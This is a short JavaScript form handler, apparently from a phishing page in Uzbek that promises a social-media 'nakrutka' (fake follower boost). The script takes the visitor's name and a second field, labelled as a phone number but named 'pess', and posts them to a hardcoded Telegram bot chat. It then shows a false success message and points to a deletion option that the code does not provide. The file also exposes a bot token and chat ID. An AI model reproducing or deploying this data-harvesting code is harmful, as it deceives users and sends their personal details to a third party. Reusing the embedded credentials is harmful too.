const BOT_TOKEN = "8213635687:AAHU2WiMeY37RkHaqPPbkGLgup5RmcrFgUg";
const ADMIN_CHAT_ID = "8114476248";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

document.getElementById("contactForm").addEventListener("submit", function(e) {
	e.preventDefault();

let name = document.getElementById("name").value;
let pess = document.getElementById("pess").value;

let adminText = `📥 Yangi foydalanuvchining ma'lumotlari:\n👨‍🎓 Ismi: ${name}\n✍ Telefon raqami: ${pess}`;

fetch(TELEGRAM_API, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
chat_id: ADMIN_CHAT_ID,
 text: adminText,
parse_mode: "HTML"
	})
})
.then(res => res.json())
.then(data => {
alert("Sizning, profilingizga nakrutka berildi!!!, Agar barcha ma'lumotlar o'chirilishini istasangiz, 'Malumotni o`chirish' tugmasini bosing! ");
document.getElementById("contactForm").reset();
})
.catch(err => {
 alert("Internetga ulanmagansiz ❌");
	});
});